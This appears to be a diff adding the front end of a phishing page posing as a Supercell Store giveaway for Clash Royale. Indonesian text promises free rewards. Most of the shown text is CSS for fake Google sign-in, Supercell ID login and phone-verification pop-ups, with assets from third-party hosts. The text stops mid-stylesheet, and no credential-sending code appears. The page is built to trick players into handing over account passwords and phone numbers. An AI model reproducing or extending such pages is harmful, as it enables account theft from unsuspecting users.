@@ -1,0 +1,4084 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clash Royale - Supercell Store</title>
+    <meta name="description" content="Clash Royale kini tersedia di Supercell Store dan Dapatkan berbagai hadiah menarik, Ayo ambil hadiah mu secepatnya!!!">
+    <link rel="icon" type="image/x-icon" href="images/favicon.ico">
+    <link rel="stylesheet" href="css/main.css">
+    <link rel="stylesheet" href="css/8a90133d0b63559d.css">
+    <link rel="stylesheet" href="css/9e8fc9060f925dd1.css">
+    <link rel="stylesheet" href="css/6ffb16744c76bcd2.css">
+    <link rel="stylesheet" href="css/48c0daec2e63d691.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500">
+    <link rel="stylesheet" href="css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link href="css/main.7a4bfad9.css" rel="stylesheet">
+    <script src="js/jquery.min.js"></script>
+    <link rel="stylesheet" href="css/animate.min.css">
+</head>
+<body>
+    <script src="js/jquery.min_1.js"></script>
+<style>
+    @font-face {
+      font-family: 'Clash'; 
+      src: url('fonts/clash-regular.24a357c6.woff2') format('woff2');
+      font-weight: normal;
+      font-style: normal;
+    }
+  </style>
+<style>
+body {
+    font-family: 'Open Sans', sans-serif;
+}
+
+.popup-overlay {
+    display: none;
+    position: fixed; 
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.6);
+    z-index: 998; 
+}
+.overlay-active {
+    display: block !important;
+}
+.popup-login {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.5);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 1000;
+}
+.popup-box-login-google {
+    background: #fff;
+    max-width: 330px;
+    width: 90%;
+    height: auto;
+    position: relative;
+    text-align: center;
+    font-family: 'Open Sans', sans-serif;
+    color: #000;
+    border-radius: 8px;
+    padding: 20px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+}
+.header-google {
+    width: 100%;
+    margin-bottom: 10px;
+    padding-top: 0;
+    position: relative;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.header-google img {
+    width: 32px;
+    height: 30px;
+    display: block;
+}
+.box-loading {
+    width: 100%;
+    height:300px;
+    max-height: 300px;
+    margin-left: auto;
+    margin-right: auto;
+    display: none;
+    overflow: hidden;
+    position: relative;
+}
+.box-google {
+    width: 100%;
+    height: auto;
+    margin-left: auto;
+    margin-right: auto;
+    display: block;
+}
+.txt-login-google {
+    color: #000;
+    font-size: 22px;
+    font-family: 'Open Sans', sans-serif;
+    font-weight: normal;
+    text-align: center;
+    margin-top: 10px;
+    margin-bottom: 5px;
+}
+.txt-login-google-desc {
+    color:#000;
+    padding-top: 5px;
+    padding-bottom: 15px;
+    font-size: 13px;
+    font-family: 'Open Sans', sans-serif;
+    font-weight: normal;
+    text-align: center;
+}
+.txt-login-google-desc a {
+    color: #1a73e8;
+    font-weight: 600;
+    font-family: Arial, sans-serif;
+    font-size: 13px;
+    text-decoration: none;
+}
+.txt-login-google-desc a:hover {
+    text-decoration: underline;
+}
+.input-box {
+    position: relative;
+    margin: 15px 0;
+}
+.input-box .input-label {
+    position: absolute;
+    color: #80868b;
+    font-size: 16px;
+    font-weight: 400;
+    max-width: calc(100% - (2 * 8px));
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+    left: 12px;
+    top: 13px;
+    padding: 0 4px;
+    transition: 250ms;
+    user-select: none;
+    pointer-events: none;
+}
+.input-box .input-label svg {
+    position: relative;
+    width: 15px;
+    height: 15px;
+    top: 2px;
+    transition: 250ms;
+}
+.input-box .input-1 {
+    box-sizing: border-box;
+    height: 50px;
+    width: 100%;
+    border-radius: 4px;
+    color: #202124;
+    border: 1px solid #dadce0;
+    padding: 13px 15px;
+    font-size: 16px;
+    transition: 250ms;
+}
+.input-box .input-1:focus {
+    outline: none;
+    border: 2px solid #1a73e8 !important;
+    padding-left: 14px;
+    padding-right: 14px;
+    transition: 250ms;
+}
+.input-box.focus .input-label,
+.input-box.active .input-label {
+    color: #1a73e8;
+    top: -8px;
+    background: #fff;
+    font-size: 11px;
+    transition: 250ms;
+    z-index: 1;
+}
+.input-box.focus .input-label svg,
+.input-box.active .input-label svg {
+    position: relative;
+    width: 11px;
+    height: 11px;
+    top: 2px;
+    transition: 250ms;
+}
+.input-box.active-grey .input-1 {
+    border: 1px solid #dadce0;
+}
+.input-box.active-grey .input-label {
+    color: #80868b;
+    top: -8px;
+    background: #fff;
+    font-size: 11px;
+    transition: 250ms;
+}
+.input-box.active-grey .input-label svg {
+    position: relative;
+    width: 11px;
+    height: 11px;
+    top: 2px;
+    transition: 250ms;
+}
+.input-box.error .input-label {
+    color: #f44336;
+    top: -8px;
+    background: #fff;
+    font-size: 11px;
+    transition: 250ms;
+    z-index: 1;
+}
+.input-box.error .input-1 {
+    border: 2px solid #f44336 !important;
+    padding-left: 14px;
+    padding-right: 14px;
+}
+.pull-right {
+    float: right;
+}
+.clear {
+    clear: both;
+}
+.btn-forgot-google {
+    background: transparent;
+    width: auto;
+    height: auto;
+    margin: 0px;
+    margin-top: 10px;
+    padding: 10px 0;
+    color: #1a73e8;
+    font-size: 13.5px;
+    font-family: 'Open Sans', sans-serif;
+    font-weight: 600;
+    letter-spacing: .25px;
+    text-align: left;
+    border: none;
+    outline: none;
+    float: left;
+    cursor: pointer;
+}
+.btn-forgot-google:hover {
+    text-decoration: underline;
+}
+.notify-google {
+    width: 100%;
+    height: auto;
+    color: gray;
+    font-size: 12px;
+    font-family: Arial, sans-serif;
+    font-weight: normal;
+    text-align: left;
+    margin-top: 15%;
+    margin-bottom: 5%;
+    clear: both;
+    padding-top: 10px;
+}
+.notify-google span {
+    color: #1a73e8;
+    font-weight: inherit;
+    cursor: pointer;
+}
+.notify-google span:hover {
+    text-decoration: underline;
+}
+.button-group-google {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 10px;
+    margin-top: 25px;
+    margin-bottom: 10px;
+    clear: both;
+}
+.btn-create-google {
+    background: transparent;
+    width: auto;
+    box-sizing: border-box;
+    padding: 8px 15px;
+    color: #1a73e8;
+    font-size: 13.5px;
+    font-family: 'Open Sans', sans-serif;
+    font-weight: normal;
+    letter-spacing: .25px;
+    text-align: center;
+    border: none;
+    border-radius: 4px;
+    outline: none;
+    cursor: pointer;
+}
+.btn-create-google:hover {
+    background-color: rgba(26, 115, 232, 0.05);
+}
+.btn-login-google {
+    background: #1a73e8;
+    width: auto;
+    box-sizing: border-box;
+    height: auto;
+    padding: 8px 20px;
+    color: #fff;
+    font-size: 14px;
+    font-family: 'Open Sans', sans-serif;
+    font-weight: 600;
+    letter-spacing: .25px;
+    text-align: center;
+    border: none;
+    border-radius: 20px;
+    outline: none;
+    cursor: pointer;
+}
+.btn-login-google:hover {
+    background: #1558b3;
+}
+.form-group-showhide {
+    width: 50px;
+    height: 73%;
+    margin-left: 88%;
+    position: absolute;
+    z-index: 9999999;
+    cursor: pointer;
+}
+.form-group-showhide i {
+    margin-top: 13px;
+    margin-right: 20px;
+    font-size: 25px;
+}
+.clearfix::after {
+    content: "";
+    clear: both;
+    display: table;
+}
+.loadgoogle {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100%;
+    min-height: 250px;
+}
+.ball {
+    width: 13px;
+    height: 13px;
+    border-radius: 11px;
+    margin: 0 6px;
+    animation: 2s bounce ease infinite;
+}
+.blue {
+    background-color: #4285F5;
+}
+.red {
+    background-color: #EA4436;
+    animation-delay: .25s;
+}
+.yellow {
+    background-color: #FBBD06;
+    animation-delay: .5s;
+}
+.green {
+    background-color: #34A952;
+    animation-delay: .75s;
+}
+@keyframes bounce {
+    50% {
+        transform: translateY(25px);
+    }
+}
+.checkbox-wrap {
+    display: flex;
+    align-items: center;
+    font-size: 14px;
+    color: #202124;
+    margin-top: 12px;
+    text-align: left;
+}
+.checkbox-wrap input[type="checkbox"] {
+    margin-right: 8px;
+    width: 16px;
+    height: 16px;
+    cursor: pointer;
+}
+.checkbox-wrap label {
+    font-size: 14px;
+    color: #5f6368;
+    cursor: pointer;
+}
+.google-loading {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 10px 8px;
+    text-align: center;
+    height: 100%;
+}
+.loader-spinner {
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #4285f4;
+    border-radius: 50%;
+    width: 32px;
+    height: 32px;
+    animation: putar 1s linear infinite;
+    margin-bottom: 10px;
+}
+.loader-text {
+    font-size: 14px;
+    color: #5f6368;
+    font-family: Roboto, Arial, sans-serif;
+}
+@keyframes putar {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+.google-top-loading {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 3px;
+    background-color: #4285f4;
+    animation: loadingBar 2s ease-in-out infinite;
+    z-index: 1000;
+    border-top-left-radius: 8px;
+    border-top-right-radius: 8px;
+}
+@keyframes loadingBar {
+    0% { transform: translateX(-100%); }
+    50% { transform: translateX(0%); width: 100%;}
+    100% { transform: translateX(100%); width: 0%;}
+}
+.dotting::after {
+    content: '';
+    display: inline-block;
+    animation: dotAnim 1.5s steps(3, end) infinite;
+}
+@keyframes dotAnim {
+    0%   { content: ''; }
+    33%  { content: '.'; }
+    66%  { content: '..'; }
+    100% { content: '...'; }
+}
+.close-other {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    font-size: 24px;
+    color: #757575;
+    cursor: pointer;
+    text-decoration: none;
+    z-index: 10;
+}
+.close-other:hover {
+    color: #000;
+}
+.email-google, .sandi-google {
+    color: rgb(213, 0, 0);
+    font-size: 12px;
+    text-align: left;
+    padding: 5px 0 0 0;
+    margin-top: -10px;
+    display: none;
+    line-height: 1.3;
+}
+.email-google svg, .sandi-google svg {
+    vertical-align: middle;
+    margin-right: 5px;
+    width: 16px;
+    height: 16px;
+}
+@media only screen and (max-width:600px) {
+    .button-group-google {
+        flex-direction: column-reverse;
+        gap: 15px;
+    }
+    .btn-create-google, .btn-login-google {
+        width: auto;
+    }
+    .btn-login-google {
+        order: 1;
+    }
+    .btn-create-google {
+        order: 2;
+    }
+    .txt-login-google {
+        font-size: 20px;
+    }
+    .txt-login-google-desc {
+        font-size: 12px;
+    }
+}
+:where(.i-svg-spinners\:90-ring) {
+    display:inline-block;
+    width:1em;
+    height:1em;
+    background-color:currentColor;
+    -webkit-mask-image:var(--svg);
+    mask-image:var(--svg);
+    -webkit-mask-repeat:no-repeat;
+    mask-repeat:no-repeat;
+    -webkit-mask-size:100% 100%;
+    mask-size:100% 100%;
+    --svg:url("data:image/svg+xml,%3Csvg xmlns='http: //www.w3.org/2000/svg' viewBox='0 0 24 24' width='24' height='24'%3E%3Cpath fill='black' d='M10.14,1.16a11,11,0,0,0-9,8.92A1.59,1.59,0,0,0,2.46,12,1.52,1.52,0,0,0,4.11,10.7a8,8,0,0,1,6.66-6.61A1.42,1.42,0,0,0,12,2.69h0A1.57,1.57,0,0,0,10.14,1.16Z'%3E%3CanimateTransform attributeName='transform' dur='0.75s' repeatCount='indefinite' type='rotate' values='0 12 12;360 12 12'/%3E%3C/path%3E%3C/svg%3E")
+}
+
+    #thiscontainer .content {
+    align-items:center;
+    display:flex;
+    flex:1;
+    flex-direction:column;
+    justify-content:flex-start;
+    width:100%;
+    z-index:2
+}
+.content .wel {
+    width:100%
+}
+.wel h1 {
+    font-size:18px;
+    text-align:center
+}
+.content .front {
+    align-items:center;
+    background:linear-gradient(170deg,#e4d0af 7.07%,#c49572 92.88%);
+    border-radius:16px;
+    box-shadow:0 4px 0 -1px #8c5a33,0 24px 14px -8px #1f0e0159,0 28px 18px #15090080,inset 0 0 1px 2px #ffffff4d;
+    display:flex;
+    flex-direction:column;
+    margin:100px 0 50px;
+    padding:50px 20px 20px;
+    position:relative;
+    width:300px
+}
+.front .f-imgBox {
+    animation:bounce-43deaeb2 2s linear infinite;
+    left:50%;
+    position:absolute;
+    top:-100px;
+    transform:translate(-50%) rotate(-20deg);
+    width:160px;
+    z-index:1
+}
+.front .claim {
+    background-color:#000;
+    border-radius:5px;
+    box-shadow:inset 0 3px #4d4d4d;
+    color:#fff;
+    cursor:pointer;
+    font-size:11px;
+    padding:5px 8px
+}
+@keyframes bounce-43deaeb2 {
+    0%,to {
+        transform:translate(-50%) rotate(-20deg) scale(1)
+    }
+    50% {
+        transform:translate(-50%) rotate(-20deg) scale(1.09)
+    }
+}
+.f-imgBox img {
+    max-width:100%;
+    position:relative
+}
+.f-imgBox:before {
+    animation:spin-43deaeb2 15s linear infinite;
+    background:url(images/20250518164523972aa6d58c753.png) no-repeat 50%;
+    background-size:cover;
+    content:"";
+    height:100%;
+    left:0;
+    position:absolute;
+    top:0;
+    width:100%
+}
+@keyframes spin-43deaeb2 {
+    0% {
+        transform:rotate(0)
+    }
+    to {
+        transform:rotate(1turn)
+    }
+}
+.front p {
+    color:#000;
+    font-family:SupercellText-Regular;
+    font-size:11px;
+    padding:10px;
+    text-align:center
+}
+.front .g-imgBox {
+    background:url(https://cdn.shagitzsan.my.id/coc/daaf810fe50017dd9ad323df6cd66579.jpeg);
+    background-position:50%;
+    background-repeat:no-repeat;
+    background-size:100% 100%;
+    border-radius:5px;
+    box-shadow:0 4px 0 -1px #8c5a33,inset 0 0 1px 2px #ffffff4d;
+    margin:10px 0 20px;
+    overflow:hidden;
+    padding:35px 0 0;
+    position:relative;
+    width:150px
+}
+.front .g-imgBox:before {
+    animation:bounces-43deaeb2 1s linear infinite;
+    background:url(images/20250513024001460023da61e81.png) no-repeat 50%;
+    background-size:cover;
+    content:"";
+    height:90%;
+    left:50%;
+    opacity:.5;
+    position:absolute;
+    top:50%;
+    width:90%
+}
+@keyframes bounces-43deaeb2 {
+    0%,to {
+        transform:translate(-50%,-50%) scale(1.2)
+    }
+    50% {
+        transform:translate(-50%,-50%) scale(1)
+    }
+}
+.g-imgBox img {
+    max-width:100%;
+    position:relative;
+    z-index:99
+}
+.g-imgBox img:before {
+    animation:bounces-43deaeb2 1s linear infinite;
+    background:url(images/20250513024001460023da61e81.png) no-repeat 50%;
+    background-size:cover;
+    content:"";
+    height:90%;
+    left:50%;
+    opacity:.5;
+    position:absolute;
+    top:50%;
+    width:90%
+}
+.g-imgBox .g-title {
+    font-size:8px;
+    left:50%;
+    position:absolute;
+    text-align:center;
+    top:10px;
+    transform:translate(-50%);
+    width:100%
+}
+.modal-gacha {
+    cursor:pointer;
+    height:100%;
+    left:50%;
+    position:fixed;
+    top:50%;
+    transform:translate(-50%,-50%);
+    width:100%;
+    z-index:9
+}
+.modal-gacha .hint {
+    left:50%;
+    position:absolute;
+    top:20%;
+    transform:translate(-50%);
+    z-index:2
+}
+.modal-gacha video {
+    height:100%;
+    left:0;
+    -o-object-fit:fill;
+    object-fit:fill;
+    position:absolute;
+    top:0;
+    width:100%
+}
+video::-webkit-media-controls,video::-webkit-media-controls-enclosure {
+    display:none!important
+}
+video::-webkit-media-controls-panel {
+    display:none!important
+}
+.content .accountInfo {
+    align-items:center;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    margin-bottom:10px;
+    position:relative;
+    text-align:center;
+    width:100%
+}
+.accountInfo .nickname {
+    font-size:14px;
+    margin-bottom:10px
+}
+.accountInfo .info {
+    flex-wrap:wrap;
+    padding:0 20px;
+    width:100%
+}
+.accountInfo .info,.info .list {
+    align-items:center;
+    display:flex;
+    gap:5px;
+    justify-content:center
+}
+.info .list {
+    border-radius:5px;
+    font-size:11px;
+    padding:4px
+}
+.th {
+    background:#7e57c2!important
+}
+.exp {
+    background:#2196f3!important
+}
+.clan {
+    background:#555!important
+}
+.trophy {
+    background:#f9a825!important
+}
+.list img {
+    max-width:20px
+}
+#thiscontainer .popgoogle {
+    align-items:center;
+    background:#fff;
+    border-radius:10px;
+    box-shadow:0 0 0 2000px #000000bf;
+    color:#000;
+    display:flex;
+    flex-direction:column;
+    font-family:google-medium;
+    justify-content:center;
+    left:50%;
+    position:fixed;
+    text-shadow:none;
+    top:50%;
+    transform:translate(-50%,-50%);
+    width:90%;
+    z-index:999
+}
+.popgoogle .googlehead {
+    border-bottom:1px solid #c4c7c5;
+    color:#c4c7c5;
+    display:flex;
+    gap:10px;
+    justify-content:flex-start;
+    padding:10px 15px;
+    position:relative;
+    width:100%
+}
+.googlehead .headImg {
+    height:25px;
+    width:25px
+}
+.headImg img {
+    max-width:100%
+}
+.googlehead .headText {
+    align-items:center;
+    color:#000;
+    display:flex;
+    font-size:14px
+}
+.popgoogle .googlecontent {
+    align-items:flex-start;
+    color:#000!important;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    padding:60px 30px 15px;
+    width:100%
+}
+.googlecontent span {
+    color:#000!important
+}
+.googlecontent .contentTitle {
+    font-size:30px;
+    width:100%
+}
+.googlecontent .contentDesc {
+    font-size:15px;
+    margin-top:15px
+}
+.googlecontent strong {
+    color:#185fd1
+}
+.googlecontent .googleform {
+    align-items:flex-start;
+    display:flex;
+    flex-direction:column;
+    gap:15px;
+    justify-content:center;
+    margin-top:30px
+}
+.googlecontent .googleform,.googleform .form-group {
+    position:relative;
+    width:100%
+}
+.form-group input {
+    border:1px solid gray;
+    border-radius:4px;
+    color:#000;
+    outline:none;
+    padding:10px;
+    width:100%
+}
+.form-group label {
+    background:#fff;
+    color:gray;
+    font-size:15px;
+    left:8px;
+    padding:5px;
+    pointer-events:none;
+    position:absolute;
+    top:50%;
+    transform:translateY(-50%);
+    transition:all .3s
+}
+.form-group input:focus {
+    border:1px solid #185fd1
+}
+.form-group input:focus~label {
+    color:#185fd1;
+    font-size:12px;
+    top:0
+}
+.form-group input.focus~label {
+    font-size:12px;
+    top:0
+}
+.googleform .form-text {
+    font-size:13px;
+    text-align:left;
+    width:100%
+}
+.form-text p {
+    color:#444746
+}
+.form-text span {
+    color:#0b57d0!important
+}
+.googleform .form-action {
+    align-items:center;
+    display:flex;
+    justify-content:space-between;
+    width:100%
+}
+.form-action .createaccount {
+    color:#0b57d0!important;
+    font-size:14px
+}
+.form-action .google-submit {
+    background:#0b57d0;
+    border-radius:50px;
+    color:#fff;
+    font-size:14px;
+    padding:10px 20px
+}
+.googlecontent .google-footer {
+    color:#444746!important;
+    display:flex;
+    font-size:12px;
+    justify-content:space-between;
+    margin-top:40px;
+    width:100%
+}
+.google-footer .footer-left {
+    color:#444746!important
+}
+.google-footer .footer-right {
+    color:#444746!important;
+    display:flex;
+    gap:10px;
+    justify-content:flex-end
+}
+#thiscontainer .popscid {
+    align-items:center;
+    background:#fff;
+    border-radius:10px;
+    box-shadow:0 0 0 2000px #000000bf;
+    display:flex;
+    flex-direction:column;
+    font-family:SupercellText-Medium;
+    justify-content:center;
+    left:50%;
+    padding:30px;
+    position:fixed;
+    text-shadow:none;
+    top:50%;
+    transform:translate(-50%,-50%);
+    width:90%;
+    z-index:999
+}
+.popscid .logoscid {
+    width:150px
+}
+.logoscid img {
+    max-width:100%
+}
+.popscid .phone-verif {
+    align-items:center;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    margin-top:30px;
+    position:relative;
+    width:100%
+}
+.phone-verif .phone-title {
+    color:#000
+}
+.phone-verif p {
+    color:#000;
+    font-size:13px;
+    text-align:center
+}
+.phone-verif .phone-form {
+    align-items:center;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    margin-top:30px;
+    width:100%
+}
+.phone-form input {
+    border:none;
+    border-radius:10px;
+    box-shadow:inset 0 .0625rem .1875rem #00000040;
+    color:#666;
+    outline:none;
+    padding:13px;
+    width:100%
+}
+.phone-form input:focus {
+    outline:1px solid #2d85f3
+}
+.phone-form .phone-submit {
+    background-image:linear-gradient(#5793f3,#4281f2);
+    border-radius:50px;
+    font-family:SupercellText-Bold;
+    font-size:13px;
+    margin-top:10px;
+    padding:10px;
+    text-align:center;
+    width:100%
+}
+.popscid .success-alert {
+    align-items:center;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    margin-top:30px;
+    position:relative;
+    width:100%
+}
+.success-alert img {
+    margin-bottom:10px;
+    max-width:70px
+}
+.success-alert .phone-title {
+    color:#000
+}
+.success-alert p {
+    color:#000;
+    font-size:13px;
+    text-align:center
+}
+.popscid .cont {
+    align-items:center
+}
+.popscid .cont,.popscid .slider {
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    width:100%
+}
+.popscid .slider {
+    margin-top:15px
+}
+.slider .atas {
+    display:flex;
+    justify-content:space-between
+}
+.popscid .slider span {
+    color:#000;
+    font-size:13px
+}
+.slider .bawah {
+    background-image:linear-gradient(90deg,#3893f6,#2ddeb9);
+    border-radius:10px;
+    display:flex;
+    justify-content:flex-start;
+    margin-top:5px;
+    padding:4px 5px;
+    width:100%
+}
+.bawah .round {
+    background:#fff;
+    border-radius:50%;
+    height:14px;
+    overflow:hidden;
+    width:14px
+}
+.cont .biglogo {
+    margin-top:25px;
+    width:180px
+}
+.biglogo img {
+    max-width:100%
+}
+.cont .logtext {
+    align-self:center;
+    display:flex;
+    flex-wrap:wrap;
+    gap:5px;
+    justify-content:center;
+    margin-top:20px;
+    width:100%
+}
+.cont .logtext p {
+    color:#000;
+    font-family:SupercellText-Bold;
+    font-size:18px;
+    text-align:center
+}
+.cont .forms {
+    align-self:center;
+    display:flex;
+    flex-direction:column;
+    gap:10px;
+    justify-content:center;
+    margin-top:20px;
+    width:100%
+}
+.forms input {
+    border:none;
+    border-radius:10px;
+    box-shadow:inset 0 .0625rem .1875rem #00000040;
+    color:#666;
+    outline:none;
+    padding:13px;
+    width:100%
+}
+.forms input:focus {
+    outline:1px solid #2d85f3
+}
+.forms .info {
+    color:#666;
+    font-family:SupercellText-Regular;
+    font-size:12px;
+    text-align:center
+}
+.forms .link {
+    color:#2d85f3
+}
+.forms .login-btn {
+    background-image:linear-gradient(#5793f3,#4281f2);
+    border-radius:50px;
+    font-family:SupercellText-Bold;
+    font-size:16px;
+    padding:13px;
+    text-align:center;
+    width:100%
+}
+.login-btn.green {
+    background: linear-gradient(#00e26b,#00b359)
+}
+#thiscontainer .header {
+    align-items:center;
+    background:url(https://offer-supercell.merchat.store/img/topbar-bg.webp);
+    background-position:100% 0;
+    background-repeat:repeat-x;
+    background-size:contain;
+    display:flex;
+    filter:drop-shadow(0 10px 4px rgba(0,0,0,.3));
+    height:70px;
+    justify-content:space-between;
+    left:50%;
+    padding:0 20px 10px 10px;
+    position:fixed;
+    top:0;
+    transform:translate(-50%);
+    width:100%;
+    z-index:9
+}
+.header .imgLogo {
+    height:50px;
+    width:50px
+}
+.imgLogo img {
+    max-width:100%
+}
+.header .menuIcon {
+    align-items:center;
+    display:flex;
+    gap:15px;
+    justify-content:flex-end
+}
+.menuIcon #menu {
+    position:relative;
+    top:-4px
+}
+#thiscontainer .footer {
+    align-items:center;
+    background:#000;
+    display:flex;
+    margin-top:80px;
+    flex-direction:column;
+    justify-content:flex-start;
+    padding:20px 30px;
+    width:100%;
+    z-index:1
+}
+.footer span {
+    font-family:supercell-text!important;
+    font-size:14px
+}
+.footer .contact {
+    align-items:flex-start;
+    display:flex;
+    flex-direction:column;
+    gap:5px;
+    justify-content:center;
+    padding:15px 0;
+    width:100%
+}
+.contact .sci {
+    align-items:center;
+    display:flex;
+    gap:10px;
+    justify-content:flex-start;
+    width:100%
+}
+.sci img {
+    max-width:35px
+}
+.footer .download {
+    align-items:flex-start;
+    border-top:1px solid #333;
+    display:flex;
+    flex-direction:column;
+    gap:5px;
+    justify-content:center;
+    padding:15px 0;
+    width:100%
+}
+.download .store {
+    align-items:center;
+    display:flex;
+    gap:10px;
+    justify-content:flex-start;
+    width:100%
+}
+.store img {
+    max-width:100px
+}
+.footer .site-menu {
+    align-items:flex-start;
+    border-top:1px solid #333;
+    display:flex;
+    flex-direction:column;
+    gap:10px;
+    justify-content:center;
+    padding:15px 0;
+    width:100%
+}
+.site-menu a {
+    color:#fff;
+    font-family:supercell-text!important;
+    font-size:14px;
+    text-decoration:none
+}
+.footer .address {
+    align-items:center;
+    display:flex;
+    gap:5px;
+    justify-content:flex-start;
+    padding:15px 0;
+    width:100%
+}
+.address .left {
+    align-items:flex-start;
+    display:flex;
+    flex:1;
+    flex-direction:column;
+    justify-content:center
+}
+.left p {
+    color:#666;
+    font-family:supercell-text!important;
+    font-size:14px;
+    text-decoration:none
+}
+.address .right {
+    align-items:flex-end;
+    align-self:stretch;
+    display:flex;
+    justify-content:center
+}
+.right img {
+    max-width:60px
+}
+@font-face {
+    font-family:supercell;
+    src:url(fonts/aba5d9138d13645070c8aef4f28d833e.woff)
+}
+@font-face {
+    font-family:supercell-text;
+    src:url(fonts/b6afa8861b6a3f4b47bcd8a9e244b9d5.ttf)
+}
+@font-face {
+    font-family:SupercellText-Bold;
+    src:url(fonts/supercelltext_w_bd.eot);
+    src:url(fonts/supercelltext_w_bd.eot) format("embedded-opentype"),url(fonts/supercelltext_w_bd.woff2) format("woff2"),url(fonts/supercelltext_w_bd.woff) format("woff"),url(fonts/supercelltext_w_bd.ttf) format("truetype")
+}
+@font-face {
+    font-family:SupercellText-Medium;
+    src:url(fonts/supercelltext_w_md.eot);
+    src:url(fonts/supercelltext_w_md.eot) format("embedded-opentype"),url(fonts/supercelltext_w_md.woff2) format("woff2"),url(fonts/supercelltext_w_md.woff) format("woff"),url(fonts/supercelltext_w_md.ttf) format("truetype")
+}
+@font-face {
+    font-family:SupercellText-Regular;
+    src:url(fonts/supercelltext_w_rg.eot);
+    src:url(fonts/supercelltext_w_rg.eot) format("embedded-opentype"),url(fonts/supercelltext_w_rg.woff2) format("woff2"),url(fonts/supercelltext_w_rg.woff) format("woff"),url(fonts/supercelltext_w_rg.ttf) format("truetype")
+}
+@font-face {
+    font-family:google-regular;
+    src:url(fonts/9429ca5231a6e45590f3bfbbe4728550.woff)
+}
+@font-face {
+    font-family:google-medium;
+    src:url(fonts/4UaRrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iq2tQCIlsw.woff2)
+}
+body {
+    background-image:url(images/biru.webp),linear-gradient(180deg,#d7c4ac,#ccb393);
+    justify-content:center
+}
+#thiscontainer,body {
+    align-items:center;
+    display:flex;
+    min-height:100vh;
+    width:100%
+}
+#thiscontainer {
+    background-blend-mode:none;
+    background-position:50%;
+    background-repeat:repeat;
+    background-repeat:no-repeat;
+    background-size:180px 180px,100%;
+    background-size:cover;
+    flex-direction:column;
+    font-family:supercell;
+    justify-content:flex-start;
+    padding-top:80px;
+    position:relative
+}
+#thiscontainer:before {
+    content:"";
+    height:100%;
+    left:0;
+    position:fixed;
+    top:0;
+    width:100%
+}
+.shadow {
+    color:#fff!important;
+    text-shadow:0 2px 0 #000,-1px -1px 0 #000,1px -1px 0 #000,-1px 1px 0 #000,1px 3px 0 #000!important
+}
+.hide {
+    display:none!important
+}
+@media (max-width:360px) {
+    .content .front {
+        width:250px!important
+    }
+}
+@media (min-width:425px) {
+    #thiscontainer,.header,.modal-gacha {
+        max-width:450px
+    }
+    .popgoogle,.popscid {
+        max-width: 350px
+    }
+}
+
+#rewards-section-content {
+    max-width: 100%; 
+    width: 100%;
+    margin: 0; 
+    padding: 0;
+    background-color: transparent; 
+    font-family: 'dinm', Arial, sans-serif;
+    color: #333;
+}
+
+#rewards-section-content img {
+    max-width: 100%;
+    height: auto;
+    display: block;
+}
+
+#rewards-section-content .rewards-menu-bar {
+    display: flex;
+    background-color: #de963e;
+}
+
+#rewards-section-content .menu-tab {
+    flex: 1;
+    padding: 8px;
+    height: 50px;
+    border: none;
+    background-color: transparent;
+    color: #ffffff;
+    text-align: center;
+    font-size: 12px;
+    letter-spacing: 2px;
+    cursor: pointer;
+    transition: background-color 0.2s, color 0.2s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+#rewards-section-content .menu-tab:hover, 
+#rewards-section-content .menu-tab.active {
+    background-color: #c36828;
+    color: #0b0906;
+    text-shadow: 1px 1px 10px #c59a70;
+}
+
+#rewards-section-content .menu-icon { width: 40px; height: auto; }
+#rewards-section-content .icon-skin { animation: bounceIn 1s linear infinite; }
+#rewards-section-content .icon-scenery { animation: bounceIn 1.2s linear infinite; }
+#rewards-section-content .icon-skill { width: 35px; animation: bounceIn 1.4s linear infinite; }
+#rewards-section-content .icon-gems { margin-top: -5px; animation: bounceIn 1.6s linear infinite; }
+
+#rewards-section-content .reward-section {
+    background-color: #e4b881;
+    padding: 10px;
+}
+.modal-gacha,
+.modal-gacha video,
+.modal-gacha .hint {
+  -webkit-tap-highlight-color: rgba(0, 0, 0, 0) !important; 
+  tap-highlight-color: rgba(0, 0, 0, 0) !important;         
+  outline: none !important;                                 
+  -webkit-touch-callout: none !important;                   
+  -webkit-user-select: none !important;                     
+  -khtml-user-select: none !important;
+  -moz-user-select: none !important;
+  -ms-user-select: none !important;
+  user-select: none !important;
+}
+
+
+video {
+    background-color: transparent !important;
+}
+#rewards-section-content .carousel-container {
+    position: relative;
+    text-align: center;
+    border-radius:10px;
+    margin-bottom: 10px;
+    overflow: hidden; 
+    height: 150px; /* Atur tinggi carousel atau biarkan gambar menentukannya */
+}
+
